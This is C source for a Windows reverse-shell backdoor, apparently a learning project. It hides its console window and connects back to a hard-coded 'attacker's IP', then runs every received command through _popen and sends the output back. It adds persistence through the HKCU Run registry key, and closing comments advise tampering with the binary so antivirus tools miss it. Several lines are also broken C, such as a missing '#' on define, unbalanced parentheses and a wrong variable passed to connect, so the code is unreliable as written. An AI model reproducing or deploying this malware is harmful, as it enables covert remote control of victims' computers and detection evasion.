#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

define bzero(p, size) (void) memset((p), 0, (size))

int sock;

int bootRun()
{
	char err[128] = "Failed\n";
	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {                        /* if the path couldn't be found/made, it returns an error message */
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) { /* if the path isn't equal to this specified path, an error message is given */
		send(sock, err, sizeof(err), 0);
		return -2;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal); /* if all of the other if statements for the error don't work, it means it has succeeded */
	send(sock, suc, sizeof(suc), 0);
	return 0;
}



char *
str_cut(char str[], int slice_from, int slice_to)
{
  if (str[0] == '\0')
          return NULL;

  char *buffer;
  size_t str_len, buffer_len;

  if (slice_to < 0 && slice_from > slice_to) {
          str_len = strlen(str);
          if (abs(slice_to) > str_len - 1)
                  return NULL;

          if (abs(slice_from) > str_len)
                  slice_from = (-1) * str_len;

          buffer_len = slice_to - slice_from;
          str += (str_len + slice_from);

  } else if (slice_from >= 0 && slice_to > slice_from) {
          str_len = strlen(str);

          if (slice_from > str_len - 1)
                  return NULL;
          buffer_len = slice_to - slice_from;
          str += slice_from;

  } else
    return NULL;

  buffer = calloc(buffer_len, sizeof(char));
  strncpy(buffer, str, buffer_len);
  return buffer;
}


void Shell(){
  char buffer[1024];
  char container[1024];
  char total_response[1024];
  
  while(1) {
    jump:
    bzero(buffer, sizeof(buffer));               /* commands sent by the server are stored in the buffer variable */
    bzero(container, sizeof(container));         /*                              */
    bzero(total_response, sizeof(total_response) /* turns all of this into zeros */               

    recv(sock, buffer, 1024, 0); 
    
    if(strncmp("q", buffer, 1) == 0) { /* compares buffer to q, if they're equal, it closes the socket */
      closesocket(sock);
      WSACleanup();
      exit(0);
     } else if(strncmp("cd ", buffer, 3) == 0) { /*checks if buffer is cd with a space after, in Windows, "cd" on its own just returns the current directory */
       chdir(str_cut(buffer, 3, 100));
    } else {
      FILE *fp;
      fp = _popen(buffer, "r"); /* reads the command ("r") and also stores it in fp */
      while(fgets(container, 1024, fp) != NULL) /* puts the first 1024 bytes of info from fp into container */
        strcat(total_response, container); /* puts the contents of container into total_response */
      }
      send(sock, total_response, sizeof(total_response), 0); /* sends the total_response variable to the server */
      fclose(fp);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, 
LPSTR lpCmdLine, int nCmdShow){

  HWND stealth; /* window handler */
  AllocConsole(); 
  stealth = FindWindowA("ConsoleWindow", NULL); /* NULL is the name of the window */

  ShowWindow(stealth, 0); /* 0 represents the hidden state of the window */

  struct sockaddr_in ServAddr;
  unsigned short ServPort;
  char *ServIP;
  WSADATA wsaData;

  ServPort = 5005;
  ServIP = "192.168.0.19";
  
  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0 {
  exit(1);
  
}
  sock = socket(AF_INET, SOCK_STREAM, 0);   
  
  memset(&ServAddr, 0, sizeof(ServAddr)); /* turns all of the memory space ServAddr uses into zeros */
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIP); /* the value is the attacker's IP, it is converted to a useable format with inet_addr */
  ServAddr.sin_port = htons(ServPort); /* the port to be attacked from, converted to a useable format with htons function */

start:
  while (connect(socket, (struct sockaddr *) &ServAddr, sizeof(ServAddr != 0))){ /*the socket is the first argument, 2nd is the memory location of the ServAddr and the 3rd is the size of ServAddr */
    Sleep(10);
    goto start;
    /* this makes the connection repeat each 10 seconds */ 
  } 
  Shell();
}
/*#####################################*/
printf("This is to change the SHA sum a bit"); 
printf("So antiviruses can't detect it as well");
/*#############################################*/
/*In a hex editor (after compiling this with ming32), change the 'This program cannot be run in DOS Mode' (up to the e of Mode), so it's harder to detect and analyse your virus */



